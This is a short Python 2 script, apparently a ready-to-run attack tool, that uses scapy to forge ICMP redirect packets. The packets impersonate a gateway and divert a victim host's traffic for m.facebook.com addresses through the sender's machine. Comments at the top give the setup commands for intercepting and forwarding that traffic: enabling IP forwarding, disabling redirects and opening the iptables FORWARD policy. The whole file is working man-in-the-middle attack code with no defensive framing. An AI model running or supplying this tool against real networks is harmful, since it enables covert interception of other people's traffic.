#!/usr/bin/python2

'''
# icmpcodes[5] = { 0: 'network-redirect', 1: 'host-redirect', 2: 'TOS-network-redirect', 3: 'TOS-host-redirect' }
# sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
# sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects'
# sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/wlp2s0/send_redirects'
# sudo iptables -P FORWARD ACCEPT
'''

import sys
from scapy.all import *

#conf.L3socket=L3RawSocket

if len(sys.argv) < 3:
   print "Send ICMP redirect message from [ip_gateway] to ip_victim redireting traffic"
   print "to [ip_myself] with destion MAC address [mac_addr_victim] for destination m.facebook.com"
   print "Usage:", sys.argv[0], "[ip_gateway]", "[ip_victim]", "[ip_myself]", "[mac_addr_victim]"
   exit(1)

conf.iface='wlp2s0'
conf.ipv6_enabled=False
ROUTER=sys.argv[1]
VITIMA=sys.argv[2]
MYSELF=sys.argv[3]
MACDST=sys.argv[4]
DESTINO=[ '31.13.85.36', '31.13.85.2', '31.13.85.8', '31.13.85.40', '31.13.85.52', '31.13.85.34', '31.13.85.37' ] # m.facebook.com

#print '[+] iface =', conf.iface
for DST in DESTINO:
    sendp(Ether(src='aa:aa:aa:aa:aa:aa', dst='bb:bb:bb:bb:bb:bb')/ \
          IP(src=ROUTER, dst=VITIMA, flags='DF')/ \
          ICMP(type=5, code=3, gw=MYSELF)/ \
          IP(src=VITIMA, dst=DST, flags='DF')/ \
          TCP(sport=int(RandShort()), dport=443, flags='PA', seq=int(RandInt()), ack=int(RandInt())) )
    print '[+] sent ICMP type 5 to IP', VITIMA, 'redirecting to', DST


